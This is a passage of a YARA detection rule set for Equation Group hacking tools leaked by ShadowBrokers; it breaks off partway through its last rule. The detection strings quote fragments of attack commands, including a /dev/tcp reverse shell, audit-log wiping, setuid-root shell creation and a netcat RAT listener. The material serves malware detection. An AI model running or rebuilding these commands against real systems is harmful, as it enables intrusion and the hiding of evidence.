
/*
   Yara Rule Set
   Author: Florian Roth
   Date: 2017-04-08
   Identifier: Equation Group hack tools leaked by ShadowBrokers

   Notice: Avoiding false positives is difficult with almost no antivirus
   coverage during the rule testing phase. Please report back false positives
   via https://github.com/Neo23x0/signature-base/issues
*/

/* Rule Set ----------------------------------------------------------------- */

rule EquationGroup_emptycriss {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file emptycriss"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "a698d35a0c4d25fd960bd40c1de1022bb0763b77938bf279e91c9330060b0b91"
      id = "658a0a2c-ea3a-5531-abea-54f0ed786e79"
   strings:
      $s1 = "./emptycriss <target IP>" fullword ascii
      $s2 = "Cut and paste the following to the telnet prompt:" fullword ascii
      $s8 = "environ define TTYPROMPT abcdef" fullword ascii
   condition:
      ( filesize < 50KB and 1 of them )
}

rule EquationGroup_scripme {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file scripme"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "a1adf1c1caad96e7b7fd92cbf419c4cfa13214e66497c9e46ec274a487cd098a"
      id = "a2c5cd8b-c104-57d9-9ce2-a0b9a8dd9288"
   strings:
      $x1 = "running \\\"tcpdump -n -n\\\", on the environment variable \\$INTERFACE, scripted" fullword ascii
      $x2 = "Cannot read $opetc/scripme.override -- are you root?" ascii
      $x3 = "$ENV{EXPLOIT_SCRIPME}" ascii
      $x4 = "$opetc/scripme.override" ascii
   condition:
      ( filesize < 30KB and 1 of them )
}

rule EquationGroup_cryptTool {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cryptTool"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "96947ad30a2ab15ca5ef53ba8969b9d9a89c48a403e8b22dd5698145ac6695d2"
      id = "e1f4e010-9c42-5b8a-8feb-2885b99307fe"
   strings:
      $s1 = "The encryption key is " fullword ascii
      $s2 = "___tempFile2.out" ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 200KB and all of them )
}

rule EquationGroup_dumppoppy {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file dumppoppy"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "4a5c01590063c78d03c092570b3206fde211daaa885caac2ab0d42051d4fc719"
      id = "c316aac3-bdd7-5187-8ae2-0a87c2f2d26f"
   strings:
      $x1 = "Unless the -c (clobber) option is used, if two RETR commands of the" fullword ascii
      $x2 = "mywarn(\"End of $destfile determined by \\\"^Connection closed by foreign host\\\"\")" fullword ascii

      $l1 = "End of $destfile determined by \"^Connection closed by foreign host"
   condition:
      ( filesize < 20KB and 1 of them )
}

rule EquationGroup_Auditcleaner {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file Auditcleaner"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "8c172a60fa9e50f0df493bf5baeb7cc311baef327431526c47114335e0097626"
      id = "39ed798a-221d-5a4b-8809-db01d5241418"
   strings:
      $x1 = "> /var/log/audit/audit.log; rm -f ." ascii
      $x2 = "Pastables to run on target:" ascii
      $x3 = "cp /var/log/audit/audit.log .tmp" ascii

      $l1 = "Here is the first good cron session from" fullword ascii
      $l2 = "No need to clean LOGIN lines." fullword ascii
   condition:
      ( filesize < 300KB and 1 of them )
}

rule EquationGroup_reverse_shell {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file reverse.shell.script"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "d29aa24e6fb9e3b3d007847e1630635d6c70186a36c4ab95268d28aa12896826"
      id = "0e9b8ff2-2187-5b61-a086-2ad4ff1a3b10"
   strings:
      $s1 = "sh >/dev/tcp/" ascii
      $s2 = " <&1 2>&1" fullword ascii
   condition:
      ( filesize < 1KB and all of them )
}

rule EquationGroup_tnmunger {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file tnmunger"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "1ab985d84871c54d36ba4d2abd9168c2a468f1ba06994459db06be13ee3ae0d2"
      id = "c95dd24f-ffc9-5e58-aed7-205daa001b8c"
   strings:
      $s1 = "TEST: mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
      $s2 = "mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 10KB and 1 of them )
}

rule EquationGroup_ys_ratload {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ys.ratload.sh"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "a340e5b5cfd41076bd4d6ad89d7157eeac264db97a9dddaae15d935937f10d75"
      id = "abd120e7-23f8-530e-b21e-c50a2b571332"
   strings:
      $x1 = "echo \"example: ${0} -l 192.168.1.1 -p 22222 -x 9999\"" fullword ascii
      $x2 = "-x [ port to start mini X server on DEFAULT = 12121 ]\"" fullword ascii
      $x3 = "CALLBACK_PORT=32177" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 3KB and 1 of them )
}

rule EquationGroup_eh_1_1_0 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eh.1.1.0.0"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "0f8dd094516f1be96da5f9addc0f97bcac8f2a348374bd9631aa912344559628"
      id = "a6f0ec1f-b0e5-5913-970d-9cdadf647c44"
   strings:
      $x1 = "usage: %s -e -v -i target IP [-c Cert File] [-k Key File]" fullword ascii
      $x2 = "TYPE=licxfer&ftp=%s&source=/var/home/ftp/pub&version=NA&licfile=" ascii
      $x3 = "[-l Log File] [-m save MAC time file(s)] [-p Server Port]" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 100KB and 1 of them )
}

rule EquationGroup_evolvingstrategy_1_0_1 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file evolvingstrategy.1.0.1.1"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "fe70e16715992cc86bbef3e71240f55c7d73815b4247d7e866c845b970233c1b"
      id = "465f709b-1791-5b36-836b-7a0c08bb9b88"
   strings:
      $s1 = "chown root sh; chmod 4777 sh;" fullword ascii
      $s2 = "cp /bin/sh .;chown root sh;" fullword ascii

      $l1 = "echo clean up when elevated:" fullword ascii

      $x1 = "EXE=$DIR/sbin/ey_vrupdate" fullword ascii
   condition:
      ( filesize < 4KB and 1 of them )
}

rule EquationGroup_toast_v3_2_0 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file toast_v3.2.0.1-linux"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "2ce2d16d24069dc29cf1464819a9dc6deed38d1e5ffc86d175b06ddb691b648b"
      id = "776014ae-be94-5d81-bceb-fefb67ee1994"
   strings:
      $x2 = "Del --- Usage: %s -l file -w wtmp -r user" fullword ascii
      $s5 = "Roasting ->%s<- at ->%d:%d<-" ascii
      $s6 = "rbnoil -Roasting ->" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and 1 of them )
}

rule EquationGroup_sshobo {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file sshobo"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "c7491898a0a77981c44847eb00fb0b186aa79a219a35ebbca944d627eefa7d45"
      id = "b9392aec-34a8-5ad2-b3fd-eea907d19701"
   strings:
      $x1 = "Requested forwarding of port %d but user is not root." fullword ascii
      $x2 = "internal error: we do not read, but chan_read_failed for istate" fullword ascii
      $x3 = "~#  - list forwarded connections" fullword ascii
      $x4 = "packet_inject_ignore: block" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and all of them )
}

rule EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file magicjack_v1.1.0.0_client-1.1.0.0.py"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1"
      id = "008cb5cf-1d2d-5312-9474-2f93db190974"
   strings:
      $x1 = "result = self.send_command(\"ls -al %s\" % self.options.DIR)" fullword ascii
      $x2 = "cmd += \"D=-l%s \" % self.options.LISTEN_PORT" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 80KB and 1 of them )
}

rule EquationGroup_packrat {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file packrat"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "d3e067879c51947d715fc2cf0d8d91c897fe9f50cae6784739b5c17e8a8559cf"
      id = "4c0619c4-728f-591f-aa02-7c28f1f42fd1"
   strings:
      $x2 = "Use this on target to get your RAT:" fullword ascii
      $x3 = "$ratremotename && " fullword ascii
      $x5 = "$command = \"$nc$bindto -vv -l -p $port < ${ratremotename}\" ;" fullword ascii
   condition:
      ( filesize < 70KB and 1 of them )
}

rule EquationGroup_telex {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file telex"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "e9713b15fc164e0f64783e7a2eac189a40e0a60e2268bd7132cfdc624dfe54ef"
      id = "23571734-869d-5d68-9339-d82f168c2e47"
   strings:
      $x1 = "usage: %s -l [ netcat listener ] [ -p optional target port instead of 23 ] <ip>" fullword ascii
      $x2 = "target is not vulnerable. exiting" fullword ascii
      $s3 = "Sending final buffer: evil_blocks and shellcode..." fullword ascii
      $s4 = "Timeout waiting for daemon to die.  Exploit probably failed." fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and 1 of them )
}

rule EquationGroup_calserver {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file calserver"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "048625e9a0ca46d7fe221e262c8dd05e7a5339990ffae2fb65a9b0d705ad6099"
      id = "abe935ee-8579-54f0-b6d3-172d6e2c0482"
   strings:
      $x1 = "usage: %s <host> <port> e <contents of a local file to be executed on target>" fullword ascii
      $x2 = "Writing your %s to target." fullword ascii
      $x3 = "(e)xploit, (r)ead, (m)ove and then write, (w)rite" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 30KB and 1 of them )
}

rule EquationGroup_porkclient {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file porkclient"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "5c14e3bcbf230a1d7e2909876b045e34b1486c8df3c85fb582d9c93ad7c57748"
      id = "5b34d5f9-bc76-5cc7-92f7-32c2b7ef7bcf"
   strings:
      $s1 = "-c COMMAND: shell command string" fullword ascii
      $s2 = "Cannot combine shell command mode with args to do socket reuse" fullword ascii
      $s3 = "-r: Reuse socket for Nopen connection (requires -t, -d, -f, -n, NO -c)" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 30KB and 1 of them )
}

rule EquationGroup_electricslide {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file electricslide"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "d27814b725568fa73641e86fa51850a17e54905c045b8b31a9a5b6d2bdc6f014"
      id = "5b1e5293-806a-58e6-b865-66025c8d8c32"
   strings:
      $x1 = "Firing with the same hosts, on altername ports (target is on 8080, listener on 443)" fullword ascii
      $x2 = "Recieved Unknown Command Payload: 0x%x" fullword ascii
      $x3 = "Usage: eslide   [options] <-t profile> <-l listenerip> <targetip>" fullword ascii
      $x4 = "-------- Delete Key - Remove a *closed* tab" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 2000KB and 1 of them )
}

rule EquationGroup_libXmexploit2 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file libXmexploit2.8"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "d7ed0234d074266cb37dd6a6a60119adb7d75cc6cc3b38654c8951b643944796"
      id = "30e94123-acc9-5185-9f5b-1f956c4cf3d1"
   strings:
      $s1 = "Usage: ./exp command display_to_return_to" fullword ascii
      $s2 = "sizeof shellcode = %d" fullword ascii
      $s3 = "Execve failed!" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 40KB and 1 of them )
}

rule EquationGroup_wrap_telnet {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file wrap-telnet.sh"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "4962b307a42ba18e987d82aa61eba15491898978d0e2f0e4beb02371bf0fd5b4"
      id = "158e6ebc-6b43-5e94-9052-31408d848875"
   strings:
      $s1 = "echo \"example: ${0} -l 192.168.1.1 -p 22222 -s 22223 -x 9999\"" fullword ascii
      $s2 = "-x [ port to start mini X server on DEFAULT = 12121 ]\"" fullword ascii
      $s3 = "echo \"Call back port2 = ${SPORT}\"" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 4KB and 1 of them )
}

rule EquationGroup_elgingamble {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file elgingamble"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "0573e12632e6c1925358f4bfecf8c263dd13edf52c633c9109fe3aae059b49dd"
      id = "fc8a63a1-9deb-5051-a02d-ed26fd1cae95"
   strings:
      $x1 = "* * * * * root chown root %s; chmod 4755 %s; %s" fullword ascii
      $x2 = "[-] kernel not vulnerable" fullword ascii
      $x3 = "[-] failed to spawn shell: %s" fullword ascii
      $x4 = "-s shell           Use shell instead of %s" fullword ascii
   condition:
      1 of them
}

rule EquationGroup_cmsd {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cmsd"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "634c50614e1f5f132f49ae204c4a28f62a32a39a3446084db5b0b49b564034b8"
      id = "9cdd3562-fed4-5b79-b056-049279404eeb"
   strings:
      $x1 = "usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]" fullword ascii
      $x2 = "error: not vulnerable" fullword ascii

      $s1 = "port=%d connected! " fullword ascii
      $s2 = "xxx.XXXXXX" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 30KB and 1 of ($x*) ) or ( 2 of them )
}

rule EquationGroup_ebbshave {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ebbshave.v5"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "eb5e0053299e087c87c2d5c6f90531cc1946019c85a43a2998c7b66a6f19ca4b"
      id = "6d4c14e2-afb1-57ce-91df-cb024258250e"
   strings:
      $s1 = "executing ./ebbnew_linux -r %s -v %s -A %s %s -t %s -p %s" fullword ascii
      $s2 = "./ebbnew_linux.wrapper -o 2 -v 2 -t 192.168.10.4 -p 32772" fullword ascii
      $s3 = "version 1 - Start with option #18 first, if it fails then try this option" fullword ascii
      $s4 = "%s is a wrapper program for ebbnew_linux exploit for Sparc Solaris RPC services" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 20KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_eggbasket {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "b078a02963610475217682e6e1d6ae0b30935273ed98743e47cc2553fbfd068f"
      id = "3fb1388a-e6b8-5c7a-ad23-ddbfc9d33d56"
   strings:
      $x1 = "# Building Shellcode into exploit." fullword ascii
      $x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
      $x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_jparsescan {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jparsescan"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984"
      id = "6b6a884e-0bbc-54f5-bb6c-00e15ca95250"
   strings:
      $s1 = "Usage:  $prog [-f directory] -p prognum [-V ver] [-t proto] -i IPadr" fullword ascii
      $s2 = "$gotsunos = ($line =~ /program version netid     address             service         owner/ );" fullword ascii
   condition:
      ( filesize < 40KB and 1 of them )
}

rule EquationGroup_sambal {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file sambal"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "2abf4bbe4debd619b99cb944298f43312db0947217437e6b71b9ea6e9a1a4fec"
      id = "b02b442c-3e24-55f8-aa5c-926c3a3a75b4"
   strings:
      $s1 = "+ Bruteforce mode." fullword ascii
      $s3 = "+ Host is not running samba!" fullword ascii
      $s4 = "+ connecting back to: [%d.%d.%d.%d:45295]" fullword ascii
      $s5 = "+ Exploit failed, try -b to bruteforce." fullword ascii
      $s7 = "Usage: %s [-bBcCdfprsStv] [host]" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
}

rule EquationGroup_pclean_v2_1_1_2 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file pclean.v2.1.1.0-linux-i386"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97"
      id = "1b31af01-8c30-513a-a615-82dcb940e06d"
   strings:
      $s3 = "** SIGNIFICANTLY IMPROVE PROCESSING TIME" fullword ascii
      $s6 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 40KB and all of them )
}

rule EquationGroup_envisioncollision {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file envisioncollision"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "75d5ec573afaf8064f5d516ae61fd105012cbeaaaa09c8c193c7b4f9c0646ea1"
      id = "8d512d9a-45a5-514a-bee1-a364beeaf560"
   strings:
      $x1 = "mysql \\$D --host=\\$H --user=\\$U --password=\\\"\\$P\\\" -e \\\"select * from \\$T" fullword ascii
      $x2 = "Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\\\"sleep 500|nc" fullword ascii
      $s3 = "$ua->agent(\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\");" fullword ascii
      $s4 = "$url = $host . \"/admin/index.php?adsess=\" . $enter . \"&app=core&module=applications&section=hooks&do=install_hook\";" fullword ascii
   condition:
      ( uint16(0) == 0x2123 and filesize < 20KB and 1 of ($x*) ) or ( 2 of them )
}

rule EquationGroup_cmsex {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cmsex"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "2d8ae842e7b16172599f061b5b1f223386684a7482e87feeb47a38a3f011b810"
      id = "9a1051a5-3f31-5fc2-85a0-beb2dea962d6"
   strings:
      $x1 = "Usage: %s -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) " fullword ascii
      $x2 = "-i target ip address / hostname " fullword ascii
      $x3 = "Note: Choosing the correct target type is a bit of guesswork." fullword ascii
      $x4 = "Solaris rpc.cmsd remote root exploit" fullword ascii
      $x5 = "If one choice fails, you may want to try another." fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and 1 of ($x*) ) or ( 2 of them )
}

rule EquationGroup_exze {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file exze"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "1af6dde6d956db26c8072bf5ff26759f1a7fa792dd1c3498ba1af06426664876"
      id = "d452b952-0c4a-501b-93f5-064d13f2c08e"
   strings:
      $s1 = "shellFile" fullword ascii
      $s2 = "completed.1" fullword ascii
      $s3 = "zeke_remove" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 80KB and all of them )
}

rule EquationGroup_DUL {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file DUL"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "24d1d50960d4ebf348b48b4db4a15e50f328ab2c0e24db805b106d527fc5fe8e"
      id = "6dd90b30-30cb-531c-b8e2-fc208b21e8e6"
   strings:
      $x1 = "?Usage: %s <shellcode> <output_file>" fullword ascii
      $x2 = "Here is the decoder+(encoded-decoder)+payload" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 80KB and 1 of them ) or ( all of them )
}

rule EquationGroup_slugger2 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file slugger2"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "a6a9ab66d73e4b443a80a69ef55a64da7f0af08dfaa7e17eb19c327301a70bdf"
      id = "3787a39e-0123-5b46-90c9-6b772b1fd96c"
   strings:
      $x1 = "usage: %s hostip port cmd [printer_name]" fullword ascii
      $x2 = "command must be less than 61 chars" fullword ascii

      $s1 = "__rw_read_waiting" ascii
      $s2 = "completed.1" fullword ascii
      $s3 = "__mutexkind" ascii
      $s4 = "__rw_pshared" ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 50KB and ( 4 of them and 1 of ($x*) ) ) or ( all of them )
}

rule EquationGroup_ebbisland {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ebbisland"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "eba07c98c7e960bb6c71dafde85f5da9f74fd61bc87793c87e04b1ae2d77e977"
      id = "d30b9f26-c2c5-5ecb-9f63-e96017788e40"
   strings:
      $x1 = "Usage: %s [-V] -t <target_ip> -p port" fullword ascii
      $x2 = "error - shellcode not as expected - unable to fix up" fullword ascii
      $x3 = "WARNING - core wipe mode - this will leave a core file on target" fullword ascii
      $x4 = "[-C] wipe target core file (leaves less incriminating core on failed target)" fullword ascii
      $x5 = "-A <jumpAddr> (shellcode address)" fullword ascii
      $x6 = "*** Insane undocumented incremental port mode!!! ***" fullword ascii
   condition:
      filesize < 250KB and 1 of them
}

rule EquationGroup_jackpop {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jackpop"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "0b208af860bb2c7ef6b1ae1fcef604c2c3d15fc558ad8ea241160bf4cbac1519"
      id = "7c650752-200b-51e7-95c2-4d385bfd5844"
   strings:
      $x1 = "%x:%d  --> %x:%d %d bytes" fullword ascii

      $s1 = "client: can't bind to local address, are you root?" fullword ascii
      $s2 = "Unable to register port" fullword ascii
      $s3 = "Could not resolve destination" fullword ascii
      $s4 = "raw troubles" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 30KB and 3 of them ) or ( all of them )
}

rule EquationGroup_parsescan {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file parsescan"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08"
      hash1 = "942c12067b0afe9ebce50aa9dfdbf64e6ed0702d9a3a00d25b4fca62a38369ef"
      id = "bbe8b518-2bf0-5de4-8fb8-9b8609d393dc"
   strings:
      $s1 = "$gotgs=1 if (($line =~ /Scan for (Sol|SNMP)\\s+version/) or" fullword ascii
      $s2 = "Usage:  $prog [-f file] -p prognum [-V ver] [-t proto] -i IPadr" fullword ascii
   condition:
